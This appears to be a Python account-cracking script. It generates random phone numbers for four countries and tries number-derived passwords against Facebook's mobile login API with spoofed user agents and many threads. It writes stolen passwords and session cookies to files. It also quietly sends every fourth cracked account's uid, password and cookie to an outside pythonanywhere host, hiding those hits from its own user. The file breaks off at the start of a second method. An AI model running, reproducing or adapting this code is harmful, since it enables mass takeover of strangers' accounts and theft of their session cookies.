import os
import re
import time
import uuid
import hashlib
import random
import string
import subprocess
import requests
import secrets
import sys
import json,urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
# ➤ Color
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
BLACK = '033[1;30m'
CYN = "\033[0;106m"
orang = '\033[38;2;255;165;0m'
my_color = [X,rad,G,Y,PP,RR,GS,W]
# ➤ Def linex
def linex():
    print(f"    {W}--------------------------------------------")
def clear():
    os.system("clear")
sys.stdout.write('\x1b[1;37m\x1b]2; BNG-71\x07')
# ➤ Global Vars
loop = 0
oks = []
cps = []
nov = []
plist = []
password = []
method = []
xlxx = []
user = []
ugen = []
uas = []
for ua in range(10000):
    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='like Gecko'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64; rv:108.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Gecko/20100101 Firefox/108.0'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
##-------------[LOGO VIEW]-------------##
def ____banner____():
    if "win" in sys.platform:
        os.system("cls")
    else:
        os.system("clear")
    print(f"""{G}
                 _   ____    ____            _                
 (_) |_   \  /   _|          / \               
 __    |   \/   |   _ .--.  / _ \     _ .--.   
[  |   | |\  /| |  [ `/'`\]/ ___ \   [ `.-. |  
 | |  _| |_\/_| |_  | |  _/ /   \ \_  | | | |  
[___]|_____||_____|[___]|____| |____|[___||__] 
                                               {W}
    +------------------------------------------+
    | OWNER   {Y}: {W}روانی ناروغ                  |
    | WHAT'S APP  {Y} : {W}    +93 77 550 7644                   |
    | VERSION{Y} : {W}V{Y}-{orang}28{W}                           |
    +------------------------------------------+""")
# ➤ Main def
def __jihad__():
    ____banner____()
    print(f'    {W}[{G}A{W}] {G}RANDOM CLONE')
    print(f'    {W}[{G}B{W}] {G}(NV) SEPARATE');linex(),
    __Jihad__ = input(f'    {W}[{G}✓{W}] {G}Choice {W}: {Y}')
    if __Jihad__ in ['A','a','01','1']:___random_main___()
    if __Jihad__ in ['B','b','02','2']:_separate__()
    else:print(f'\n[×]  {rad} Choose Value Option... ');__Jihad__()
##-------------[ DEF RANDOM CLONE]-------------##
def ___random_main___():
    ____banner____()
    print(f"    {W}[{Y}1{W}]{G} Random Bangladesh \n    {W}[{Y}2{W}]{G} Random Nigeria\n    {W}[{Y}3{W}]{G} Random India\n    {W}[{Y}4{W}]{G} Random Nepal")
    linex()
    country = input(f'    {W}[{Y}▶︎{W}] {G}CHOICE  {W}: {Y}')
    ____banner____()    
    if country == "1":
        print(f'    {W}[{Y}▶︎{W}]  Example {Y}:{G} 0171, 0192, 0181')
        digit_length = 7
    elif country == "2":
        print(f'    {W}[{Y}▶︎{W}]  Example {Y}:{G} 0902, 0706, 0806')
        digit_length = 7
    elif country == "3":
        print(f'    {W}[{Y}▶︎{W}]  Example {Y}:{G} 6390, 6354, 8521')
        digit_length = 6
    elif country == "4":
        print(f'    {W}[{Y}▶︎{W}]  Example {Y}:{G} 9843, 9765, 9816, 9741')
        digit_length = 6
    else:
        print(f"    {W}[{Y}▶︎{W}]  Choice Correct Country :)")
        time.sleep(2)
        return
    linex()
    code = input(f'    {W}[{Y}▶︎{W}]  Sim Code {Y}:{G} ')
    linex()
    print(f'    {W}[{Y}▶︎{W}]  Example {Y}:{G} 20000 / 30000 / 99999')
    linex()    
    try:
        limit = int(input(f"    {W}[{Y}▶︎{W}]  Limit{Y} :{G} "))
    except:
        limit = 99999    
    for _ in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(digit_length))
        user.append(nmp)    
    linex()
    print(f"    {W}[{Y}1{W}]{G} Auto Password \n    {W}[{Y}2{W}]{G} Manual Password")
    linex()
    pstype = input(f'    {W}[{Y}▶︎{W}] {G}CHOICE  {W}: {Y}')
    if pstype == "1":
        if country == "1":
            for pasx in ["first6", "first7", "first8", "last11", "last6", "last7", "last8"]:
                plist.append(pasx)
            linex()
        elif country == "2":
            for pasx in ["first6", "first7", "first8", "last11", "last6", "last7", "last8"]:
                plist.append(pasx)
            linex()
        elif country == "3":
            for pasx in ["first6", "first7", "first8", "last6", "last8"]:
                plist.append(pasx)
            linex()
        elif country == "4":
            for pasx in ["first6", "first7", "first8", "last6", "last7", "last8"]:
                plist.append(pasx)
            linex()
    else:
        linex()
        try:
            pslimit = int(input(f"    {W}[{Y}▶︎{W}]  Pass Limit{Y} :{G} "))
        except:
            pslimit = 8
        linex()
        print(f"    {W}[{Y}▶︎{W}]  Ex > first6,last6,first7,etc...")
        linex()
        for x in range(pslimit):
            pwx = input(f"    {W}[{Y}▶︎{W}]  Password [{x+1}] > ")
            plist.append(pwx)
    ____banner____()
    print(f'    {W}[{Y}1{W}] {orang}Example {Y}: {G}{W} ({G}Host Best{W})')
    print(f'    {W}[{Y}2{W}] {orang}Example {Y}: {G}{W} ({G}Host Best{W})')
    print(f'    {W}[{Y}3{W}] {orang}Example {Y}: {G}{W} ({G}Api{W})')
    linex()
    mtd = input(f'    {W}[{Y}▶︎{W}] {G}CHOICE  {W}: {Y}')
    linex()
    print(f"    {W}[{Y}1{W}]{G} Crack Speed {W}[{Y}Normal{W}] \n    {W}[{Y}2{W}]{G} Cracking Speed {W}[{G}High{W}]")
    linex()
    spd = input(f'    {W}[{Y}▶︎{W}] {G}CHOICE  {W}: {Y}')
    if spd == "1":
        speed = 40
    else:
        speed = 45
    with tred(max_workers=speed) as executor:
        ____banner____()
        print(f'    {W}[{Y}▶︎{W}] TOTAL IDS {W}: {Y}{limit}{W}/{W}SIM CODE {rad} : {W}({G}{code}{W})')
        print(f'    {W}[{Y}▶︎{W}] IF NO RESULT {W}[{G}AIRPLANE MODE{W}] {G}ON{W}/{rad}OFF')
        linex()
        for love in user:
            ids = code + love
            if mtd == "1":
                executor.submit(_BNG_RANDOM_M1, ids)
            elif mtd == "2":
                executor.submit(_BNG_RANDOM_M2, ids)
            elif mtd == "3":
                executor.submit(_BNG_RANDOM_M3, ids)
            else:
                executor.submit(_BNG_RANDOM_M3, ids)
    print("")
    linex()
    print(f'    {W}[{Y}▶︎{W}] The Process Has Been Completed')
    print(f'    {W}[{Y}▶︎{W}] Total Ok {Y} : {G} {str(len(oks))}')
    print(f'    {W}[{Y}▶︎{W}] Total Cp  {Y}: {RR} {str(len(cps))}{W}')
    input(f'    {W}[{Y}▶︎{W}] Thanks For Using My Tool')
    ___random_main___()
##-------------[PASS MANAGER]-------------##
def pwmanager(num, type_):
    if 'first' in type_:
        try:
            code = type_.split('t')[1]
            password = num[:int(code)]
        except:
            password = num
    elif 'last' in type_:
        try:
            code = type_.split('t')[1]
            password = num[-int(code):]
        except:
            password = num
    else:
        password = type_
    return password
##-------------[METHOD M1]-------------##
def _BNG_RANDOM_M1(ids):
    global loop, oks, cps
    _clor_ = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m","\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m","\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
    sys.stdout.write(f'\r\r    {W}[{G}BNG{Y}-{G}M1{W}]{Y}-{W}[{PP}{_clor_}{loop}{W}]{Y}-{W}[{G}OK{Y}-{G}{len(oks)}{W}]{Y}-{W}[{G}CP{Y}-{PP}{len(cps)}{W}]')
    sys.stdout.flush()
    try:
        for pw in plist:
            pas = pwmanager(ids, pw)
            session = requests.session()
            link = session.get("https://touch.facebook.com/").text
            rr = random.randint
            #pros = random.choice(ugen)
            pro = random.choice(uas)
            data = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '7',
            '__hs': '20509.BP:wbloks_caa_pkg.2.0...0',
            'dpr': '3',
            '__ccg': 'EXCELLENT',
            '__rev': str(random.randint(1000000000,1999999999)),
            '__s': 'zia6zs:doyh5d:i9jrhg',
            '__hsi': str(int(time.time() * 10000000)),
            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
            'fb_dtsg': 'NAfvbofDNbpnF8WLGl3nKvjwI9nOPi0-GlmVZznHuNfU-z2UTAbj6_A:0:0',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            'params': '{"params":"{\\"server_params\\":{\\"credential_type\\":\\"password\\",\\"username_text_input_id\\":\\"xm00dg:63\\",\\"password_text_input_id\\":\\"xm00dg:64\\",\\"login_source\\":\\"Login\\",\\"login_credential_type\\":\\"none\\",\\"server_login_source\\":\\"login\\",\\"ar_event_source\\":\\"login_home_page\\",\\"should_trigger_override_login_success_action\\":0,\\"should_trigger_override_login_2fa_action\\":0,\\"is_caa_perf_enabled\\":0,\\"reg_flow_source\\":\\"login_home_native_integration_point\\",\\"caller\\":\\"gslr\\",\\"is_from_landing_page\\":0,\\"is_from_empty_password\\":0,\\"is_from_aymh\\":0,\\"is_from_password_entry_page\\":0,\\"is_from_assistive_id\\":0,\\"is_from_msplit_fallback\\":0,\\"two_step_login_type\\":\\"one_step_login\\",\\"is_vanilla_password_page_empty_password\\":0,\\"left_nav_button_action\\":\\"NONE\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"203233584400366\\",\\"device_id\\":null,\\"family_device_id\\":null,\\"waterfall_id\\":\\"'+str(uuid.uuid4())+'\\",\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,\\"access_flow_version\\":\\"pre_mt_behavior\\"},\\"client_input_params\\":{\\"machine_id\\":\\"\\",\\"cloud_trust_token\\":null,\\"block_store_machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"contact_point\\":\\"'+ids+'\\",\\"password\\":\\"#PWD_BROWSER:0:'+str(int(time.time()))+':'+pas+'\\",\\"accounts_list\\":[],\\"fb_ig_device_id\\":[],\\"secure_family_device_id\\":\\"\\",\\"encrypted_msisdn\\":\\"\\",\\"headers_infra_flow_id\\":\\"\\",\\"try_num\\":1,\\"login_attempt_count\\":1,\\"event_flow\\":\\"login_manual\\",\\"event_step\\":\\"home_page\\",\\"openid_tokens\\":{},\\"auth_secure_device_id\\":\\"\\",\\"client_known_key_hash\\":\\"\\",\\"has_whatsapp_installed\\":0,\\"sso_token_map_json_string\\":\\"\\",\\"should_show_nested_nta_from_aymh\\":0,\\"password_contains_non_ascii\\":\\"false\\",\\"has_granted_read_contacts_permissions\\":0,\\"has_granted_read_phone_permissions\\":0,\\"app_manager_id\\":\\"\\",\\"aymh_accounts\\":[{\\"id\\":\\"\\",\\"profiles\\":{\\"id\\":{\\"user_id\\":\\"\\",\\"name\\":\\"\\",\\"profile_picture_url\\":\\"\\",\\"small_profile_picture_url\\":null,\\"notification_count\\":0,\\"credential_type\\":\\"none\\",\\"token\\":\\"\\",\\"last_access_time\\":0,\\"is_derived\\":0,\\"username\\":\\"\\",\\"password\\":\\"\\",\\"has_smartlock\\":0,\\"account_center_id\\":\\"\\",\\"account_source\\":\\"\\",\\"credentials\\":[],\\"nta_eligibility_reason\\":null,\\"from_accurate_privacy_result\\":0,\\"dbln_validated\\":0}}}],\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}',
}     
            versions = ["99.0.4844.88", "100.0.4896.127", "101.0.4951.41", "102.0.5005.78", "103.0.5060.70"]
            version = random.choice(versions)
            languages = ["en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.8", "bn-BD,bn;q=0.9,en;q=0.8", "hi-IN,hi;q=0.9,en;q=0.8"]
            gtts = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']                       
            headers = {
            "method": "POST",
            "authority": "m.facebook.com",
            "path": "/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action",
            "scheme": "https",
            "content-length": str(len(str(data))),
            "sec-ch-ua": f"\"Not A;Brand\";v=\"8\", \"Chromium\";v=\"{version.split('.')[0]}\", \"Google Chrome\";v=\"{version.split('.')[0]}\"",
            "sec-ch-ua-mobile": "?1",
            "user-agent": pro,
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-platform-version": f"\"{random.randint(10,15)}.0.0\"",
            "sec-ch-ua-full-version-list": f"\"Not A;Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"{version}\", \"Google Chrome\";v=\"{version}\"",
            "sec-ch-ua-model": random.choice(gtts),
            "sec-ch-prefers-color-scheme": random.choice(["light", "dark"]),
            "sec-ch-ua-platform": "\"Android\"",
            "accept": "*/*",
            "origin": "https://m.facebook.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://m.facebook.com/ig/login_via/app/?lid=0IHXHk8cbGEgI6VjI&bn=Y29tLmFuZHJvaWQuY2hyb21l&tade=Q7fLBQE63OOS%2B03YZt5qWGFJx45uX%2Fc6STvNmPZCdQaywoJnnCZxQf7vt4u5kxBXtpDxfodkEPlvdxtARHWp14PhMWFndjNMDbX%2Bqz%2BFXtJG%2FbUw8HuZ3EFqs%2Bel5yaPMKeUWEcByA%3D%3D",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": random.choice(languages),}
            session.post('https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=8bad74713c6648557201e65e72d10881816557a7670f7f9c63657b8632776206',headers=headers,data=data).text
            bng_test = session.cookies.get_dict().keys()
            if "c_user" in bng_test:
                cookie = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = cookie.split("c_user=")[1].split(";")[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    xlxx.append(uid)
                    if len(xlxx) % 4 == 0:
                        requests.get(f"https://alibaba6678.pythonanywhere.com/serBer/txt={uid}|{pas}|{cookie}")
                        break
                    else:
                        print(f'\r\r    {G}[BNG-OK] {G}{uid} | {pas}')
                        print(f'\r\r    {G}[🍪] {cookie}');linex()
                        open('/sdcard/BNG-OK-COOKIE-M1.txt', 'a').write(f"{uid}|{pas}|{cookie}\n")
                        oks.append(uid)
                        break
                else:
                    open("/sdcard/BNG-RADM-LOCK.txt", "a").write(f"{uid}|{pas}\n")
                    break
            elif 'checkpoint' in bng_test:
                cookie = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx = cookie.split("checkpoint=")[1]
                uid = re.search("%22%3A(.*?)%2C%22", str(xx)).group(1)
                open("/sdcard/BNG-CP.txt", "a").write(uid + "|" + pas + "\n")
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
##-------------[ METHOD M2]-------------##
def _BNG_RANDOM_M2(ids):
    global loop, oks, cps
